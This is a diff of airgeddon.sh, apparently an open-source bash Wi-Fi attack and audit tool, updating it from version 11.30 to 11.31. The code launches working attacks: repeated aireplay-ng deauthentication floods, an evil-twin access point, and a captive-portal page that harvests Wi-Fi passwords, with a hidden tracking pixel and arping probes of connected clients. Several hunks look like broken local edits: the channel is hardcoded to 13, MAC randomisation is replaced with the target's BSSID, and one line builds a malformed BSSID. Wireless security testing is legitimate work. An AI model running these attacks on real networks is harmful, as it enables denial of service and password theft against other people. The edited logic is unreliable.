@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Version......: 11.30
+#Version......: 11.31
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -86,6 +86,7 @@ internal_tools=(
 				"ccze"
 				"xset"
 				"loginctl"
+				"arping"
 			)
 
 declare -A possible_package_names=(
@@ -134,13 +135,13 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="11.30"
-language_strings_expected_version="11.30-1"
+airgeddon_version="11.31"
+language_strings_expected_version="11.31-1"
 standardhandshake_filename="handshake-01.cap"
 standardpmkid_filename="pmkid_hash.txt"
 standardpmkidcap_filename="pmkid.cap"
 timeout_capture_handshake="20"
-timeout_capture_pmkid="25"
+timeout_capture_pmkid="15"
 osversionfile_dir="/etc/"
 plugins_dir="plugins/"
 ag_orchestrator_file="ag.orchestrator.txt"
@@ -284,11 +285,13 @@ certspass="airgeddon"
 default_certs_path="/etc/hostapd-wpe/certs/"
 default_certs_pass="whatever"
 webserver_file="ag.lighttpd.conf"
+webserver_log="ag.lighttpd.log"
 webdir="www/"
 indexfile="index.htm"
 checkfile="check.htm"
 cssfile="portal.css"
 jsfile="portal.js"
+pixelfile="pixel.png"
 attemptsfile="ag.et_attempts.txt"
 currentpassfile="ag.et_currentpass.txt"
 et_successfile="ag.et_success.txt"
@@ -720,6 +723,7 @@ function debug_print() {
 							"read_yesno"
 							"register_instance_pid"
 							"remove_warnings"
+							"set_absolute_path"
 							"set_script_paths"
 							"special_text_missed_optional_tool"
 							"store_array"
@@ -4462,9 +4466,9 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=3
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "${1} (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 --deauth-rc 5 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
+				get_tmux_process_id "aireplay-ng --deauth 0 --deauth-rc 5 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -4529,9 +4533,9 @@ function launch_dos_pursuit_mode_attack() {
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
 			iw "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			dos_delay=3
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 --deauth-rc 5 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
+				get_tmux_process_id "aireplay-ng --deauth 0 --deauth-rc 5 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -4710,8 +4714,8 @@ function exec_aireplaydeauth() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack" "active"
-		wait_for_process "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 --deauth-rc 5 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack" "active"
+		wait_for_process "aireplay-ng --deauth 0 --deauth-rc 5 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 	fi
 }
 
@@ -6021,6 +6025,7 @@ function clean_tmpfiles() {
 		rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${webserver_log}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${certsdir}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
@@ -8770,6 +8775,9 @@ function manage_asleap_pot() {
 			if [ "${yesno}" = "n" ]; then
 				asleap_attack_finished=1
 			fi
+		else
+			language_strings "${language}" 540 "red"
+			language_strings "${language}" 115 "read"
 		fi
 	fi
 }
@@ -9859,11 +9867,23 @@ function set_hostapd_config() {
 	local digit_to_change
 	digit_to_change="${bssid:10:1}"
 	((different_mac_digit=("16#${digit_to_change}" + 1 + RANDOM % 15) % 16))
-	et_bssid=$(printf %s%X%s\\n "${bssid::10}" "${different_mac_digit}" "${bssid:11}")
+	# et_bssid=$(printf %s%X%s\\n "${bssid::10}" "${different_mac_digit}" "${bssid:11}")
+	et_bssid=$(printf "${bssid}")
 
 	{
 	echo -e "interface=${interface}"
 	echo -e "driver=nl80211"
+	echo -e "beacon_int=15"
+	echo -e "preamble=1"
+	# echo -e "channel=13"
+	echo -e "dtim_period=1"
+
+	echo -e "rts_threshold=0"
+	echo -e "fragm_threshold=256"
+	echo -e "ap_max_inactivity=3600"
+
+	# echo -e "auth_algs=1"
+	# echo -e "ap_max_inactivity=30"
 	echo -e "ssid=${essid}"
 	echo -e "bssid=${et_bssid}"
 	echo -e "channel=${channel}"
@@ -9893,7 +9913,8 @@ function set_hostapd_wpe_config() {
 
 	rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1
 
-	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n 100 | grep -v "${bssid:10:1}" | head -c 1)
+	# different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n 100 | grep -v "${bssid:10:1}" | head -c 1)
+	different_mac_digit=${bssid}
 	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}
 
 	{
@@ -10131,7 +10152,8 @@ function set_spoofed_mac() {
 		fi
 	fi
 
-	new_random_mac=$(od -An -N6 -tx1 /dev/urandom | sed -e 's/^  *//' -e 's/  */:/g' -e 's/:$//' -e 's/^\(.\)[13579bdf]/\10/')
+	# new_random_mac=$(od -An -N6 -tx1 /dev/urandom | sed -e 's/^  *//' -e 's/  */:/g' -e 's/:$//' -e 's/^\(.\)[13579bdf]/\10/')
+	new_random_mac=${bssid}
 
 	ip link set "${1}" down > /dev/null 2>&1
 	ip link set dev "${1}" address "${new_random_mac}" > /dev/null 2>&1
@@ -10267,7 +10289,7 @@ function exec_et_deauth() {
 			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
 		;;
 		"Aireplay")
-			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
+			deauth_et_cmd="aireplay-ng --deauth 0 --deauth-rc 5 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
 		;;
 		"Wds Confusion")
 			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
@@ -11317,16 +11339,37 @@ function set_et_control_script() {
 						client_hostname=""
 						[[ ${client} =~ .*(\(.+\)).* ]] && client_hostname="${BASH_REMATCH[1]}"
 						if [[ -z "${client_hostname}" ]]; then
-							echo -e "\t${client_ip} ${client_mac}"
+							echo -ne "\t${client_ip} ${client_mac}"
 						else
-							echo -e "\t${client_ip} ${client_mac} ${client_hostname}"
+							echo -ne "\t${client_ip} ${client_mac} ${client_hostname}"
 						fi
+	EOF
+
+	cat >&7 <<-EOF
+						if [ "${right_arping}" -eq 1 ]; then
+							if arping -C 3 -I "${interface}" -w 5 -p -q "\${client_ip}"; then
+								echo -ne " ${blue_color}${et_misc_texts[${language},29]}${green_color} ✓${normal_color}"
+							else
+								echo -ne " ${blue_color}${et_misc_texts[${language},29]}${red_color} ✘${normal_color}"
+							fi
+						fi
+						if [ "\${et_heredoc_mode}" = "et_captive_portal" ]; then
+							if grep -qE "^\${client_ip} 200 GET /${pixelfile}" "${tmpdir}${webserver_log}" > /dev/null 2>&1; then
+								echo -ne " ${blue_color}${et_misc_texts[${language},28]}${green_color} ✓${normal_color}"
+							else
+								echo -ne " ${blue_color}${et_misc_texts[${language},28]}${red_color} ✘${normal_color}"
+							fi
+						fi
+						echo -ne "\n"
+	EOF
+
+	cat >&7 <<-'EOF'
 					fi
 					client_ips+=(${client_ip})
 				done
 			fi
 			echo -ne "\033[K\033[u"
-			sleep 0.3
+			sleep 1
 			current_window_size="$(tput cols)x$(tput lines)"
 			if [ "${current_window_size}" != "${stored_window_size}" ]; then
 				stored_window_size="${current_window_size}"
@@ -11428,13 +11471,15 @@ function set_webserver_config() {
 	debug_print
 
 	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${webserver_log}" > /dev/null 2>&1
 
 	{
 	echo -e "server.document-root = \"${tmpdir}${webdir}\"\n"
 	echo -e "server.modules = ("
 	echo -e "\"mod_auth\","
 	echo -e "\"mod_cgi\","
-	echo -e "\"mod_redirect\""
+	echo -e "\"mod_redirect\","
+	echo -e "\"mod_accesslog\""
 	echo -e ")\n"
 	echo -e "\$HTTP[\"host\"] =~ \"(.*)\" {"
 	echo -e "url.redirect = ( \"^/index.htm$\" => \"/\")"
@@ -11456,15 +11501,19 @@ function set_webserver_config() {
 	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
 	echo -e "url.redirect-code = 302"
 	echo -e "}"
-	echo -e "server.bind = \"${et_ip_router}\"\n"
+	echo -e "server.bind = \"${et_ip_router}\""
 	echo -e "server.port = ${www_port}\n"
-	echo -e "index-file.names = ( \"${indexfile}\" )\n"
+	echo -e "index-file.names = (\"${indexfile}\")"
 	echo -e "server.error-handler-404 = \"/\"\n"
 	echo -e "mimetype.assign = ("
 	echo -e "\".css\" => \"text/css\","
 	echo -e "\".js\" => \"text/javascript\""
 	echo -e ")\n"
-	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
+	echo -e "cgi.assign = (\".htm\" => \"/bin/bash\")\n"
+	echo -e "accesslog.filename = \"${tmpdir}${webserver_log}\""
+	echo -e "accesslog.escaping = \"default\""
+	echo -e "accesslog.format = \"%h %s %r %v%U %t '%{User-Agent}i'\""
+	echo -e "\$HTTP[\"remote-ip\"] == \"${loopback_ip}\" { accesslog.filename = \"\" }"
 	} >> "${tmpdir}${webserver_file}"
 
 	sleep 2
@@ -11507,7 +11556,7 @@ function prepare_captive_portal_data() {
 										["Ubiquiti"]="00156D 002722 0418D6 18E829 24A43C 44D9E7 687251 68D79A 7483C2 74ACB9 788A20 802AA8 B4FBE4 DC9FDB E063DA F09FC2 F492BF FCECDA"
 										["Vantiva"]="F85E42"
 										["Xavi"]="000138 E09153"
-										["ZTE"]="000947 0015EB 0019C6 001E73 002293 002512 0026ED 004A77 041DC7 049573 08181A 083FBC 086083 0C1262 0C3747 0C72D9 10D0AB 143EBF 146080 18132D 1844E6 18686A 1C2704 208986 20E882 24586E 247E51 24C44A 24D3F2 287B09 288CB8 28FF3E 2C26C5 2C957F 300C23 304240 309935 30D386 30F31D 343759 344B50 344DEA 346987 347839 34DAB7 34DE34 34E0CF 384608 386E88 38D82F 38E1AA 38E2DD 3CDA2A 3CF652 4413D0 44F436 44FB5A 44FFBA 48282F 4859A4 48A74E 4C09B4 4C16F1 4C494F 4CABFC 4CAC0A 4CCBF5 5078B3 50AF4D 540955 5422F8 54BE53 585FF6 5C3A3D 601466 601888 6073BC 64136C 681AB2 688AF0 689FF0 6C8B2F 6CA75F 6CD2BA 702E22 709F2D 744AA4 749781 74A78E 74B57E 781D4A 78312B 789682 78C1A7 78E8B6 7C3953 80B07B 84139F 841C70 84742A 847460 885DFB 88D274 8C14B4 8C68C8 8C7967 8CDC02 8CE081 8CE117 901D27 90869B 90C7D8 90D8F3 90FD73 94A7B7 94BF80 94E3EE 98006A 981333 986CF5 98F428 98F537 9C2F4E 9C63ED 9C6F52 9CA9E4 9CD24B 9CE91C A091C8 A0EC80 A44027 A47E39 A8A668 AC00D0 AC6462 B00AD5 B075D5 B0ACD2 B0B194 B0C19E B41C30 B49842 B4B362 B4DEDF B805AB BC1695 C09FE1 C0B101 C0FD84 C4741E C4A366 C85A9F C864C7 C87B5B C8EAF8 CC1AFA CC7B35 D0154A D058A8 D05BA8 D0608C D071C4 D437D7 D47226 D476EA D49E05 D4B709 D4C1C8 D855A3 D87495 D8A8C8 DC028E DC7137 DCDFD6 DCF8B9 E01954 E0383F E07C13 E0C3F3 E447B3 E47723 E47E9A E4BD4B E4CA12 E8A1F8 E8ACAD E8B541 EC1D7F EC237B EC6CB5 EC8263 EC8A4C ECF0FE F084C9 F41F88 F46DE2 F4B5AA F4B8A7 F4E4AD F80DF0 F8A34F F8DFA8 FC2D5E FC94CE FCC897"
+										["ZTE"]="000947 0015EB 0019C6 001E73 002293 002512 0026ED 004A77 041DC7 049573 08181A 083FBC 086083 0C1262 0C3747 0C72D9 10D0AB 143EBF 146080 146B9A 18132D 1844E6 18686A 1C2704 208986 20E882 24586E 247E51 24C44A 24D3F2 287B09 288CB8 28FF3E 2C26C5 2C957F 300C23 304240 309935 30D386 30F31D 343759 344B50 344DEA 346987 347839 34DAB7 34DE34 34E0CF 384608 386E88 38D82F 38E1AA 38E2DD 3CDA2A 3CF652 4413D0 44F436 44FB5A 44FFBA 48282F 4859A4 48A74E 4C09B4 4C16F1 4C494F 4CABFC 4CAC0A 4CCBF5 5078B3 50AF4D 540955 5422F8 54BE53 585FF6 5C3A3D 601466 601888 6073BC 64136C 681AB2 688AF0 689FF0 6C8B2F 6CA75F 6CD2BA 702E22 709F2D 744AA4 749781 74A78E 74B57E 781D4A 78312B 789682 78C1A7 78E8B6 7C3953 80B07B 84139F 841C70 84742A 847460 885DFB 88D274 8C14B4 8C68C8 8C7967 8CDC02 8CE081 8CE117 901D27 90869B 90C7D8 90D8F3 90FD73 949869 94A7B7 94BF80 94E3EE 98006A 981333 986CF5 98F428 98F537 9C2F4E 9C63ED 9C6F52 9CA9E4 9CD24B 9CE91C A091C8 A0EC80 A44027 A47E39 A4F33B A8A668 AC00D0 AC6462 B00AD5 B075D5 B0ACD2 B0B194 B0C19E B41C30 B49842 B4B362 B4DEDF B805AB BC1695 C09FE1 C0B101 C0FD84 C4741E C4A366 C85A9F C864C7 C87B5B C8EAF8 CC1AFA CC7B35 D0154A D058A8 D05BA8 D0608C D071C4 D437D7 D47226 D476EA D49E05 D4B709 D4C1C8 D855A3 D87495 D8A8C8 DC028E DC7137 DCDFD6 DCF8B9 E01954 E0383F E07C13 E0C3F3 E447B3 E47723 E47E9A E4BD4B E4CA12 E8A1F8 E8ACAD E8B541 EC1D7F EC237B EC6CB5 EC8263 EC8A4C ECF0FE F084C9 F41F88 F46DE2 F4B5AA F4B8A7 F4E4AD F80DF0 F8A34F F8DFA8 FC2D5E FC94CE FCC897"
 									)
 
 		declare -gA cp_router_colors=(
@@ -11560,7 +11609,7 @@ function prepare_captive_portal_data() {
 				captive_portal_button_color=$(echo "${captive_portal_data}" | cut -d " " -f 2)
 				captive_portal_shadow_color=$(echo "${captive_portal_data}" | cut -d " " -f 3)
 				captive_portal_img=$(echo "${captive_portal_data}" | cut -d " " -f 4)
-				captive_portal_logo='<div class="logo"><img src="'${captive_portal_img}'" alt="Logo" style="display:block;margin:auto;width:200px;"></div>'
+				captive_portal_logo='\t\t\t\t<div class="logo">\n\t\t\t\t\t\t\t<img src="'${captive_portal_img}'" title="Logo" style="display: block; margin: auto; width: 200px;"/>\n\t\t\t\t\t\t</div>'
 				cp_vendor_detected="1"
 				break
 			fi
@@ -11630,9 +11679,13 @@ function set_captive_portal_page() {
 	echo -e "#showpass {"
 	echo -e "\tvertical-align: top;"
 	echo -e "}\n"
-	echo -e "@media screen (min-width: 1000px) {"
+	echo -e "@media screen and (min-width: 1000px) {"
 	echo -e "\t.content {"
 	echo -e "\t\twidth: 50%;"
+	echo -e "\t\tposition: absolute;"
+	echo -e "\t\ttop: 50%;"
+	echo -e "\t\tleft: 50%;"
+	echo -e "\t\ttransform: translate(-50%, -50%);"
 	echo -e "\t}"
 	echo -e "}\n"
 	} >> "${tmpdir}${webdir}${cssfile}"
@@ -11678,9 +11731,13 @@ function set_captive_portal_page() {
 	echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
 	echo -e "echo -e '\t</head>'"
 	echo -e "echo -e '\t<body>'"
+	echo -e "echo -e '\t\t<img src=\"${pixelfile}\" style=\"display: none;\"/>'"
 	echo -e "echo -e '\t\t<div class=\"content\">'"
 	echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
-	echo -e "echo -e '\t\t\t\t${captive_portal_logo}<div class=\"title\">'"
+	if [ "${advanced_captive_portal}" -eq 1 ]; then
+		echo -e "echo -e '${captive_portal_logo}'"
+	fi
+	echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
 	echo -e "echo -e '\t\t\t\t\t<p>${et_misc_texts[${captive_portal_language},9]}</p>'"
 	echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">${essid//[\`\']/}</span>'"
 	echo -e "echo -e '\t\t\t\t</div>'"
@@ -11696,6 +11753,8 @@ function set_captive_portal_page() {
 	echo -e "echo '</html>'"
 	echo -e "exit 0"
 	} >> "${tmpdir}${webdir}${indexfile}"
+
+	base64 -d <<< "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdj+P///38ACfsD/QVDRcoAAAAASUVORK5CYII=" > "${tmpdir}${webdir}${pixelfile}"
 
 	exec 4>"${tmpdir}${webdir}${checkfile}"
 
@@ -12392,7 +12451,8 @@ function recover_current_channel() {
 	local recovered_channel
 	recovered_channel=$(cat "${tmpdir}${channelfile}" 2> /dev/null)
 	if [ -n "${recovered_channel}" ]; then
-		channel="${recovered_channel}"
+		# channel="${recovered_channel}"
+		channel="13"
 	fi
 }
 
@@ -12692,9 +12752,9 @@ function capture_handshake_evil_twin() {
 		"Aireplay")
 			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 --deauth-rc 5 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
+				get_tmux_process_id "aireplay-ng --deauth 0 --deauth-rc 5 -a ${bssid} --ignore-negative-one ${interface}"
 				processidattack="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -12772,6 +12832,15 @@ function capture_pmkid_handshake() {
 		language_strings "${language}" 14 "red"
 		language_strings "${language}" 115 "read"
 		return 1
+	fi
+
+	if [ "${channel}" -gt 14 ]; then
+		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
+			echo
+			language_strings "${language}" 515 "red"
+			language_strings "${language}" 115 "read"
+			return 1
+		fi
 	fi
 
 	if ! validate_network_encryption_type "WPA"; then
@@ -13255,9 +13324,9 @@ function dos_handshake_menu() {
 				capture_handshake_window
 				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
-				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 --deauth-rc 5 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-					get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
+					get_tmux_process_id "aireplay-ng --deauth 0 --deauth-rc 5 -a ${bssid} --ignore-negative-one ${interface}"
 					processidattack="${global_process_pid}"
 					global_process_pid=""
 				fi
@@ -13388,13 +13457,13 @@ function launch_pmkid_capture() {
 
 		tcpdump -i "${interface}" wlan addr3 "${bssid}" -ddd > "${tmpdir}pmkid.bpf"
 
-		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
+		if [ "${channel}" -gt 14 ]; then
 			hcxdumptool_band_modifier="b"
 		else
 			hcxdumptool_band_modifier="a"
 		fi
 
-		hcxdumptool_parameters="-c ${channel}${hcxdumptool_band_modifier} -F --rds=1 --bpf=${tmpdir}pmkid.bpf -w ${tmpdir}pmkid.pcapng"
+		hcxdumptool_parameters="-c ${channel}${hcxdumptool_band_modifier} --rds=1 --bpf=${tmpdir}pmkid.bpf -w ${tmpdir}pmkid.pcapng"
 	elif compare_floats_greater_or_equal "${hcxdumptool_version}" "${minimum_hcxdumptool_filterap_version}"; then
 		rm -rf "${tmpdir}target.txt" > /dev/null 2>&1
 		echo "${bssid//:}" > "${tmpdir}target.txt"
@@ -13924,7 +13993,8 @@ function select_target() {
 
 	essid=${network_names[${selected_target_network}]}
 	check_hidden_essid "normal" "verify"
-	channel=${channels[${selected_target_network}]}
+	# channel=${channels[${selected_target_network}]}
+	channel="13"
 	bssid=${macs[${selected_target_network}]}
 	enc=${encs[${selected_target_network}]}
 }
@@ -14224,6 +14294,16 @@ function et_prerequisites() {
 			language_strings "${language}" 719 "yellow"
 		else
 			language_strings "${language}" 392 "blue"
+		fi
+	fi
+
+	if hash arping 2> /dev/null; then
+		if check_right_arping; then
+			right_arping=1
+		else
+			echo
+			language_strings "${language}" 722 "yellow"
+			language_strings "${language}" 115 "read"
 		fi
 	fi
 
@@ -14573,11 +14653,36 @@ function capture_traps() {
 						exit_script_option
 					;;
 					*)
+						if [ -n "${capture_traps_in_progress}" ]; then
+							echo
+							language_strings "${language}" 12 "green"
+							echo -n "> "
+							return
+						fi
+
+						capture_traps_in_progress=1
+						local previous_default_choice="${default_choice}"
 						ask_yesno 12 "yes"
 						if [ "${yesno}" = "y" ]; then
 							exit_code=1
+							capture_traps_in_progress=""
 							exit_script_option
 						else
+							if [ -n "${previous_default_choice}" ]; then
+								default_choice="${previous_default_choice}"
+								case ${previous_default_choice^^} in
+									"Y"|"YES")
+										visual_choice="[Y/n]"
+									;;
+									"N"|"NO")
+										visual_choice="[y/N]"
+									;;
+									"")
+										visual_choice="[y/n]"
+									;;
+								esac
+							fi
+
 							language_strings "${language}" 224 "blue"
 							if [ "${last_buffered_type1}" = "read" ]; then
 								language_strings "${language}" "${last_buffered_message2}" "${last_buffered_type2}"
@@ -14600,6 +14705,8 @@ function capture_traps() {
 		echo
 		hardcore_exit
 	fi
+
+	capture_traps_in_progress=""
 }
 
 #Exit the script managing possible pending tasks
@@ -14806,6 +14913,17 @@ function set_hashcat_parameters() {
 	fi
 }
 
+#Detects if your arping version is the right one or if it is the bad iputils-arping
+function check_right_arping() {
+
+	debug_print
+
+	if arping 2> /dev/null | grep -Eq "^ARPing"; then
+		return 0
+	fi
+	return 1
+}
+
 #Determine aircrack version
 #shellcheck disable=SC2034
 function get_aircrack_version() {
@@ -15002,6 +15120,9 @@ function set_absolute_path() {
 
 	local string_path
 	string_path=$(readlink -f "${1}")
+	if [ -d "${string_path}" ]; then
+		string_path="${string_path%/}/"
+	fi
 	echo "${string_path}"
 }
 
@@ -15222,7 +15343,11 @@ function detect_distro_phase1() {
 		if uname -a | grep -i "${i}" > /dev/null; then
 			possible_distro="${i^}"
 			if [ "${possible_distro}" != "Arch" ]; then
-				distro="${i^}"
+				if [[ "$(uname -a)" =~ [Rr]pi ]]; then
+					distro="Raspberry Pi OS"
+				else
+					distro="${i^}"
+				fi
 				break
 			else
 				if uname -a | grep -i "aarch64" > /dev/null; then
@@ -15271,7 +15396,7 @@ function detect_distro_phase2() {
 				elif [[ "${extra_os_info}" =~ [Pp]arrot ]]; then
 					distro="Parrot arm"
 					is_arm=1
-				elif [[ "${extra_os_info}" =~ [Dd]ebian ]] && [[ "$(uname -a)" =~ [Rr]aspberry ]]; then
+				elif [[ "${extra_os_info}" =~ [Dd]ebian ]] && [[ "$(uname -a)" =~ [Rr]aspberry|[Rr]pi ]]; then
 					distro="Raspberry Pi OS"
 					is_arm=1
 				fi
@@ -15428,8 +15553,8 @@ function special_distro_features() {
 		;;
 		"BlackArch")
 			networkmanager_cmd="systemctl restart NetworkManager.service"
-			xratio=7.3
-			yratio=14
+			xratio=8
+			yratio=18
 			ywindow_edge_lines=1
 			ywindow_edge_pixels=1
 		;;
@@ -15892,6 +16017,8 @@ function initialize_script_settings() {
 	card_vif_support=0
 	country_code="00"
 	clean_all_iptables_nftables=1
+	right_arping=0
+	capture_traps_in_progress=""
 }
 
 #Detect graphics system
@@ -15932,6 +16059,11 @@ function check_graphics_system() {
 		"tty"|*)
 			if [ -z "${XAUTHORITY}" ]; then
 				xterm_ok=0
+				if hash xset 2> /dev/null; then
+					if xset -q > /dev/null 2>&1; then
+						xterm_ok=1
+					fi
+				fi
 			fi
 		;;
 	esac
